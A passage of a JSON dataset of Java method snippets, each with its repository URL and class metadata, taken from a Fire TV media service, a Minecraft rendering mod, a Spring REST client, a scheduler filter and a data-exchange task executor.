(Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getDuration", "params": ["DurationListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDuration(final DurationListener listener) {        final String error = \"Error getting duration\";        RemoteMediaPlayer.AsyncFuture<Long> asyncFuture;        try {            asyncFuture = remoteMediaPlayer.getDuration();            handleAsyncFuture(listener, asyncFuture, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));            return;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getPosition", "params": ["PositionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPosition(final PositionListener listener) {        final String error = \"Error getting position\";        RemoteMediaPlayer.AsyncFuture<Long> asyncFuture;        try {            asyncFuture = remoteMediaPlayer.getPosition();            handleAsyncFuture(listener, asyncFuture, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));            return;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getPlayState", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPlayState(final PlayStateListener listener) {        final String error = \"Error getting play state\";        RemoteMediaPlayer.AsyncFuture<MediaPlayerStatus> asyncFuture;        try {            asyncFuture = remoteMediaPlayer.getStatus();            handleAsyncFutureWithConversion(listener, asyncFuture,                    new ConvertResult<PlayStateStatus, MediaPlayerStatus>() {                        @Override                        public PlayStateStatus convert(MediaPlayerStatus data) {                            return createPlayStateStatusFromFireTVStatus(data);                        }                    }, error);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));            return;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "subscribePlayState", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<PlayStateListener>", "snippet": "    public ServiceSubscription<PlayStateListener> subscribePlayState(            final PlayStateListener listener) {        if (playStateSubscription == null) {            playStateSubscription = new PlayStateSubscription(listener);            remoteMediaPlayer.addStatusListener(playStateSubscription);        } else if (!playStateSubscription.getListeners().contains(listener)) {            playStateSubscription.addListener(listener);        }        getPlayState(listener);        return playStateSubscription;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "createPlayStateStatusFromFireTVStatus", "params": ["MediaPlayerStatus"], "throws": null, "modifiers": [], "return_type": "PlayStateStatus", "snippet": "    PlayStateStatus createPlayStateStatusFromFireTVStatus(MediaPlayerStatus status) {        PlayStateStatus playState = PlayStateStatus.Unknown;        switch (status.getState()) {            case PreparingMedia:                playState = PlayStateStatus.Buffering;                break;            case Playing:                playState = PlayStateStatus.Playing;                break;            case Paused:                playState = PlayStateStatus.Paused;                break;            case Finished:                playState = PlayStateStatus.Finished;                break;            case NoSource:                playState = PlayStateStatus.Idle;        }        return playState;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "getMetadata", "params": ["String", "String", "String", "String", "String"], "throws": ["JSONException"], "modifiers": ["private"], "return_type": "String", "snippet": "    private String getMetadata(String title, String description, String mimeType, String iconImage, String subsUrl)            throws JSONException {        JSONObject json = new JSONObject();        if (title != null && !title.isEmpty()) {            json.put(META_TITLE, title);        }        if (description != null && !description.isEmpty()) {            json.put(META_DESCRIPTION, description);        }        json.put(META_MIME_TYPE, mimeType);        if (iconImage != null && !iconImage.isEmpty()) {            json.put(META_ICON_IMAGE, iconImage);        }        json.put(META_NOREPLAY, true);        if(subsUrl != null && !subsUrl.isEmpty()) {            JSONArray tracksArray = new JSONArray();            JSONObject trackObj = new JSONObject();            trackObj.put(META_KIND, \"subtitles\");            trackObj.put(META_LABEL, \"Subtitle\");            trackObj.put(META_SRC, subsUrl);            trackObj.put(META_SRCLANG, \"en\");            tracksArray.put(trackObj);            json.put(META_TRACKS, tracksArray);        }        return json.toString();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "createMediaLaunchObject", "params": [], "throws": null, "modifiers": ["private"], "return_type": "MediaLaunchObject", "snippet": "    private MediaLaunchObject createMediaLaunchObject() {        LaunchSession launchSession = new LaunchSession();        launchSession.setService(this);        launchSession.setSessionType(LaunchSession.LaunchSessionType.Media);        launchSession.setAppId(remoteMediaPlayer.getUniqueIdentifier());        launchSession.setAppName(remoteMediaPlayer.getName());        MediaLaunchObject mediaLaunchObject = new MediaLaunchObject(launchSession, this);        return mediaLaunchObject;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "setMediaSourceFromMediaInfo", "params": ["MediaInfo", "LaunchListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setMediaSourceFromMediaInfo(MediaInfo mediaInfo, LaunchListener listener) {        String iconSrc = \"\";        if (mediaInfo.getImages() != null && !mediaInfo.getImages().isEmpty()) {            ImageInfo imageInfo = mediaInfo.getImages().get(0);            if (imageInfo != null) {                iconSrc = imageInfo.getUrl();            }        }        setMediaSource(mediaInfo.getUrl(), mediaInfo.getSubsUrl(), mediaInfo.getMimeType(), mediaInfo.getTitle(),                mediaInfo.getDescription(), iconSrc, listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "setMediaSource", "params": ["String", "String", "String", "String", "String", "String", "LaunchListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setMediaSource(String url, String subsUrl, String mimeType, String title, String description,                                String iconSrc, final LaunchListener listener) {        final String error = \"Error setting media source\";        RemoteMediaPlayer.AsyncFuture<Void> asyncFuture = null;        try {            final String metadata = getMetadata(title, description, mimeType, iconSrc, subsUrl);            asyncFuture = remoteMediaPlayer.setMediaSource(url, metadata, true, false);        } catch (Exception e) {            Util.postError(listener, new FireTVServiceError(error, e));            return;        }        handleAsyncFutureWithConversion(listener, asyncFuture,                new ConvertResult<MediaLaunchObject, Void>() {            @Override            public MediaLaunchObject convert(Void data) {                return createMediaLaunchObject();            }        }, error);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "handleVoidAsyncFuture", "params": ["ResponseListener<Object>", "RemoteMediaPlayer", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleVoidAsyncFuture(final ResponseListener<Object> listener,                                       final RemoteMediaPlayer.AsyncFuture<Void> asyncFuture,                                       final String errorMessage) {        handleAsyncFutureWithConversion(listener, asyncFuture, new ConvertResult<Object, Void>() {            @Override            public Object convert(Void data) {                return data;            }        }, errorMessage);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "handleAsyncFuture", "params": ["ResponseListener<T>", "RemoteMediaPlayer", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private <T> void handleAsyncFuture(final ResponseListener<T> listener,                                     final RemoteMediaPlayer.AsyncFuture<T> asyncFuture,                                     final String errorMessage) {        handleAsyncFutureWithConversion(listener, asyncFuture, new ConvertResult<T, T>() {            @Override            public T convert(T data) {                return data;            }        }, errorMessage);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "handleAsyncFutureWithConversion", "params": ["ResponseListener<Response>", "RemoteMediaPlayer", "ConvertResult<Response,Result>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private <Response, Result> void handleAsyncFutureWithConversion(            final ResponseListener<Response> listener,            final RemoteMediaPlayer.AsyncFuture<Result> asyncFuture,            final ConvertResult<Response, Result> conversion,            final String errorMessage) {        if (asyncFuture != null) {            asyncFuture.getAsync(new RemoteMediaPlayer.FutureListener<Result>() {                @Override                public void futureIsNow(Future<Result> future) {                    try {                        Result result = future.get();                        Util.postSuccess(listener, conversion.convert(result));                    } catch (ExecutionException e) {                        Util.postError(listener, new FireTVServiceError(errorMessage,                                e.getCause()));                    } catch (Exception e) {                        Util.postError(listener, new FireTVServiceError(errorMessage, e));                    }                }            });        } else {            Util.postError(listener, new FireTVServiceError(errorMessage));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "FireTVService", "extends": "DeviceService", "implements": ["MediaPlayer", "MediaControl"], "modifiers": ["public"]}}, {"method_name": "notifyListeners", "params": ["Status"], "throws": null, "modifiers": ["synchronized"], "return_type": "void", "snippet": "        synchronized void notifyListeners(final Status status) {            if (!status.equals(prevStatus)) {                Util.runOnUI(new Runnable() {                    @Override                    public void run() {                        for (Listener listener : listeners) {                            listener.onSuccess(status);                        }                    }                });                prevStatus = status;            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "Subscription", "extends": null, "implements": ["ServiceSubscription"], "modifiers": ["private", "static", "abstract"]}}, {"method_name": "addListener", "params": ["Listener"], "throws": null, "modifiers": ["public"], "return_type": "Listener", "snippet": "        public Listener addListener(Listener listener) {            listeners.add(listener);            return listener;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "Subscription", "extends": null, "implements": ["ServiceSubscription"], "modifiers": ["private", "static", "abstract"]}}, {"method_name": "removeListener", "params": ["Listener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void removeListener(Listener listener) {            listeners.remove(listener);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "Subscription", "extends": null, "implements": ["ServiceSubscription"], "modifiers": ["private", "static", "abstract"]}}, {"method_name": "getListeners", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Listener>", "snippet": "        public List<Listener> getListeners() {            return listeners;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "Subscription", "extends": null, "implements": ["ServiceSubscription"], "modifiers": ["private", "static", "abstract"]}}, {"method_name": "onStatusChange", "params": ["MediaPlayerStatus", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onStatusChange(MediaPlayerStatus mediaPlayerStatus, long position) {            final PlayStateStatus status = createPlayStateStatusFromFireTVStatus(mediaPlayerStatus);            notifyListeners(status);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "PlayStateSubscription", "extends": "Subscription", "implements": ["CustomMediaPlayer"], "modifiers": []}}, {"method_name": "unsubscribe", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void unsubscribe() {            remoteMediaPlayer.removeStatusListener(this);            playStateSubscription = null;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/modules/firetv/src/com/connectsdk/service/FireTVService.java", "stars": "4", "class": {"name": "PlayStateSubscription", "extends": "Subscription", "implements": ["CustomMediaPlayer"], "modifiers": []}}, {"method_name": "onRenderEntity", "params": ["RenderLivingEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onRenderEntity(RenderLivingEvent.Pre event) {        GlStateManager.pushMatrix();        GlStateManager.disableLighting();        if (!(event.getEntity() instanceof EntityPlayer)) {            ShaderHelper.useShader(ShaderLib.GAUSS_SHADER);        }    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onPostRenderEntity", "params": ["RenderLivingEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onPostRenderEntity(RenderLivingEvent.Post event) {        if (!(event.getEntity() instanceof EntityPlayer)) {            ShaderHelper.releaseShader();        }        GlStateManager.enableLighting();        GlStateManager.popMatrix();    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onRenderMistuned", "params": ["TickEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onRenderMistuned(TickEvent.RenderTickEvent event) {        if (event.phase != TickEvent.Phase.END || !MistuneRenderManager.isShouldEffect())            return;        if (tempBuffer == null) {            tempBuffer = new TempFrameBuffer(Minecraft.getMinecraft().displayWidth, Minecraft.getMinecraft().displayHeight, true);            tempBuffer.setFramebufferColor(0f, 0f, 0f, 0f);        }        GL11.glPushMatrix();        Framebuffer mb = Minecraft.getMinecraft().getFramebuffer();        tempBuffer.createBindFramebuffer(Minecraft.getMinecraft().displayWidth, Minecraft.getMinecraft().displayHeight);        OpenGlHelper.glBindFramebuffer(OpenGlHelper.GL_FRAMEBUFFER, tempBuffer != null ? tempBuffer.framebufferObject : 0);        ShaderHelper.useShader(ShaderLib.MISTUNE_SHADER, MistuneRenderManager.getMistuneRenderCallback());        mb.framebufferRender(Minecraft.getMinecraft().displayWidth, Minecraft.getMinecraft().displayHeight);        ShaderHelper.releaseShader();        OpenGlHelper.glBindFramebuffer(OpenGlHelper.GL_FRAMEBUFFER, mb.framebufferObject);        tempBuffer.framebufferRender(Minecraft.getMinecraft().displayWidth, Minecraft.getMinecraft().displayHeight);        GL11.glPopMatrix();    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onRenderCOLLICULUS", "params": ["RenderWorldLastEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onRenderCOLLICULUS(RenderWorldLastEvent event) {        GlStateManager.pushMatrix();        GL11.glPushAttrib(GL11.GL_LIGHTING_BIT);        GlStateManager.disableTexture2D();        GlStateManager.enableBlend();        EntityPlayer player = Minecraft.getMinecraft().player;        World world = Minecraft.getMinecraft().world;        Set<BlockPos> seen = getSeenBlocks(player, event.getPartialTicks(), 1. / 2., 0.01, 8);        for (BlockPos pos : seen)            renderBlockOutlineAt(pos, Color.HSBtoRGB(world.getWorldTime() % 200 / 200f, .6f, 1f), 5f);        GlStateManager.enableTexture2D();        GlStateManager.disableBlend();        GL11.glPopAttrib();        GlStateManager.popMatrix();    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSeenBlocks", "params": ["EntityPlayer", "float", "double", "double", "double"], "throws": null, "modifiers": ["private", "static"], "return_type": "Set<BlockPos>", "snippet": "    private static Set<BlockPos> getSeenBlocks(EntityPlayer player, float partialTicks, double offset, double step, double range) {        Set<BlockPos> poses = new HashSet<>();        Vec3d vecPlayer = player.getLook(partialTicks);        for (double i = -offset; i <= offset; i += step) {            for (double j = -offset; j <= offset; j += step) {                Vec3d vecSph = VectorHelper.cartesianToSpherical(vecPlayer).addVector(0., i, j);                Vec3d vec3d = player.getPositionEyes(partialTicks);                Vec3d vec3d1 = VectorHelper.sphericalToCartesian(vecSph);                Vec3d vec3d2 = vec3d.addVector(vec3d1.x * range, vec3d1.y * range, vec3d1.z * range);                RayTraceResult rayTraceResult = player.world.rayTraceBlocks(vec3d, vec3d2, false, false, true);                if (rayTraceResult != null && rayTraceResult.typeOfHit == RayTraceResult.Type.BLOCK)                    poses.add(rayTraceResult.getBlockPos());            }        }        return poses;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "renderBlockOutlineAt", "params": ["BlockPos", "int", "float"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void renderBlockOutlineAt(BlockPos pos, int color, float thickness) {        double renderPosX = Minecraft.getMinecraft().getRenderManager().renderPosX;        double renderPosY = Minecraft.getMinecraft().getRenderManager().renderPosY;        double renderPosZ = Minecraft.getMinecraft().getRenderManager().renderPosZ;        GlStateManager.pushMatrix();        GlStateManager.translate(pos.getX() - renderPosX, pos.getY() - renderPosY, pos.getZ() - renderPosZ + 1);        Color colorRGB = new Color(color);        GL11.glColor4ub((byte) colorRGB.getRed(), (byte) colorRGB.getGreen(), (byte) colorRGB.getBlue(), (byte) 255);        World world = Minecraft.getMinecraft().world;        IBlockState state = world.getBlockState(pos);        Block block = state.getBlock();        drawWireframe:        {            if (block != null) {                AxisAlignedBB axis;                axis = state.getSelectedBoundingBox(world, pos);                if (axis == null)                    break drawWireframe;                axis = axis.offset(-pos.getX(), -pos.getY(), -(pos.getZ() + 1));                GlStateManager.scale(1F, 1F, 1F);                GL11.glLineWidth(thickness);                renderBlockOutline(axis);                GL11.glLineWidth(thickness + 3F);                GL11.glColor4ub((byte) colorRGB.getRed(), (byte) colorRGB.getGreen(), (byte) colorRGB.getBlue(), (byte) 64);                renderBlockOutline(axis);            }        }        GL11.glColor4ub((byte) 255, (byte) 255, (byte) 255, (byte) 255);        GlStateManager.popMatrix();    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "renderBlockOutline", "params": ["AxisAlignedBB"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void renderBlockOutline(AxisAlignedBB aabb) {        Tessellator tessellator = Tessellator.getInstance();        double ix = aabb.minX;        double iy = aabb.minY;        double iz = aabb.minZ;        double ax = aabb.maxX;        double ay = aabb.maxY;        double az = aabb.maxZ;        tessellator.getBuffer().begin(GL11.GL_LINES, DefaultVertexFormats.POSITION);        tessellator.getBuffer().pos(ix, iy, iz).endVertex();        tessellator.getBuffer().pos(ix, ay, iz).endVertex();        tessellator.getBuffer().pos(ix, ay, iz).endVertex();        tessellator.getBuffer().pos(ax, ay, iz).endVertex();        tessellator.getBuffer().pos(ax, ay, iz).endVertex();        tessellator.getBuffer().pos(ax, iy, iz).endVertex();        tessellator.getBuffer().pos(ax, iy, iz).endVertex();        tessellator.getBuffer().pos(ix, iy, iz).endVertex();        tessellator.getBuffer().pos(ix, iy, az).endVertex();        tessellator.getBuffer().pos(ix, ay, az).endVertex();        tessellator.getBuffer().pos(ix, iy, az).endVertex();        tessellator.getBuffer().pos(ax, iy, az).endVertex();        tessellator.getBuffer().pos(ax, iy, az).endVertex();        tessellator.getBuffer().pos(ax, ay, az).endVertex();        tessellator.getBuffer().pos(ix, ay, az).endVertex();        tessellator.getBuffer().pos(ax, ay, az).endVertex();        tessellator.getBuffer().pos(ix, iy, iz).endVertex();        tessellator.getBuffer().pos(ix, iy, az).endVertex();        tessellator.getBuffer().pos(ix, ay, iz).endVertex();        tessellator.getBuffer().pos(ix, ay, az).endVertex();        tessellator.getBuffer().pos(ax, iy, iz).endVertex();        tessellator.getBuffer().pos(ax, iy, az).endVertex();        tessellator.getBuffer().pos(ax, ay, iz).endVertex();        tessellator.getBuffer().pos(ax, ay, az).endVertex();        tessellator.draw();    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPhaseVisualEffect", "params": ["RenderPlayerEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPhaseVisualEffect(RenderPlayerEvent.Pre event) {        if (event.getEntityPlayer().isPotionActive(PotionRegistry.POTION_PHASE)) {            GlStateManager.pushMatrix();            GlStateManager.enableNormalize();            GlStateManager.enableBlend();            GlStateManager.blendFunc(770, 771);            GlStateManager.color(1f, 1f, 1f, 0.7f);        }    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "unsetPhaseVisualEffect", "params": ["RenderPlayerEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void unsetPhaseVisualEffect(RenderPlayerEvent.Post event) {        if (event.getEntityPlayer().isPotionActive(PotionRegistry.POTION_PHASE)) {            GlStateManager.disableBlend();            GlStateManager.disableNormalize();            GlStateManager.popMatrix();        }    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setToNormal", "params": ["TickEvent"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setToNormal(TickEvent.PlayerTickEvent event) {        ItemStack head = event.player.getItemStackFromSlot(EntityEquipmentSlot.HEAD);        if (head == ItemStack.EMPTY || !(head.getItem() instanceof ItemColliculus))            MistuneRenderManager.setShouldEffect(false);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Render/RenderEvent.java", "stars": "2", "class": {"name": "RenderEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "serverClient", "params": ["ServerClientProperties"], "throws": null, "modifiers": ["public"], "return_type": "ServerClient", "snippet": "        public ServerClient serverClient(ServerClientProperties properties) {            return new ServerClientRest(properties);        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientConfiguration.java", "stars": "4", "class": {"name": "ServerClientRestConfiguration", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "serverClient", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ServerClient", "snippet": "        public ServerClient serverClient() {            return new ServerClientStub();        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientConfiguration.java", "stars": "4", "class": {"name": "ServerClientStubConfiguration", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "create", "params": ["String", "Filter<T,V>"], "throws": null, "modifiers": ["public", "static"], "return_type": "FactorFilter<T,V>", "snippet": "  public static <T, V> FactorFilter<T, V> create(final String factorName,      final Filter<T, V> filter) {    if (null == factorName || factorName.length() == 0 || null == filter) {      logger.error(          \"failed to create instance of FactorFilter, at least one of the input paramters are invalid\");      return null;    }    return new FactorFilter<>(factorName, filter);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorFilter.java", "stars": "18", "class": {"name": "FactorFilter", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getFactorName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFactorName() {    return this.factorName;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorFilter.java", "stars": "18", "class": {"name": "FactorFilter", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "filterTarget", "params": ["T", "V"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean filterTarget(final T filteringTarget, final V referencingObject) {    return this.filter.filterTarget(filteringTarget, referencingObject);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorFilter.java", "stars": "18", "class": {"name": "FactorFilter", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        AtomicLong lastTime = new AtomicLong(0);        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {            try {                List<TaskState> taskStates = jobContainerManager.collectStateList();                if(!taskStates.isEmpty() || System.currentTimeMillis() - lastTime.get() >= TimeUnit.SECONDS.toMillis(configuration.getIdleHeartBeat())) {                    lastTime.set(System.currentTimeMillis());                    String host = MachineInfo.getIpAddress(configuration.getNetworkInterface());                    if (StringUtils.isBlank(host)) {                        throw new RuntimeException(\"Cannot get IP address\");                    }                    ExecutorNode node = new ExecutorNode();                    node.setAddress(host + \":\" + port);                    node.setCpuRate((float) MachineInfo.cpuRate(4));                    node.setMemRate((float) MachineInfo.memoryRate(4));                    node.setDefaultNode(configuration.isNodeDefault());                    if(StringUtils.isNotBlank(configuration.getNodeTabs())){                        node.setTabNames(Arrays.asList(configuration.getNodeTabs().split(\",\")));                    }                    node.setTaskStates(taskStates);                    Response<String> rsp = callBackService.heartbeat(node);                    if (rsp.getCode() != 0) {                        LOG.error(\"Heartbeat error,{}\", rsp.getMessage());                    }                }            } catch (Exception e) {                LOG.error(\"Heartbeat error\", e);            }        }, 5, configuration.getActiveHeartBeat(), TimeUnit.SECONDS);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/service/impl/ExecutorServiceImpl.java", "stars": "23", "class": {"name": "ExecutorServiceImpl", "extends": null, "implements": ["ExecutorService"], "modifiers": ["public"]}}, {"method_name": "run", "params": ["ExecuteReq", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean run(ExecuteReq req, String execUser) {        Long jobId = req.getJobId();        Long taskId = req.getTaskId();        String jobConfig = req.getJobConfig();        Map<String, Object> params = req.getTaskParams();        Long timeout = req.getTimeout();        boolean result;        try {            JobExecutor newJobExecutor = new JobExecutor(jobId, () ->{                TaskConfiguration taskConfig = TaskConfiguration.from(\"{}\");                TaskConfigBuilder configBuilder = null;                LOG.info(\"Start to build task configuration, jobId: [{}], taskId: [{}]\", jobId, taskId);                try {                    configBuilder = AppUtil.getBean(TaskConfigBuilder.PREFIX +                                    String.valueOf(req.getEngine()).toLowerCase(), TaskConfigBuilder.class);                }catch(BeansException e){                    //cannot find the handler                    LOG.info(e.getMessage());                }                if(null != configBuilder){                    taskConfig = configBuilder.build(jobId, taskId, jobConfig, params);                }                LOG.info(\"Build task configuration succeed, jobId:[{}], taskId: [{}]\", jobId, taskId);                String taskExecUser = String.valueOf(params.getOrDefault(DefaultParams.Task.PARAM_EXEC_USER,  \"\"));                String execUser0 = execUser;                if(StringUtils.isNotBlank(taskExecUser)){                    //Overwrite executive user                    execUser0 = taskExecUser;                }                return TaskProcessUtils.buildTaskProcess(req.getEngine(), jobId, taskId, execUser0, taskConfig,                        configuration, req.getEngineParams());            }, Math.toIntExact(timeout), (process, status, message) -> {                //complete listener                LOG.info(\"Task jobId [{}],taskId [{}],execute complete.status {},message {}\",                        jobId, taskId,status,message);                Response<String> rsp = callBackService.notifyJobComplete(taskId,status, AppUtil.getIpAndPort(), message);                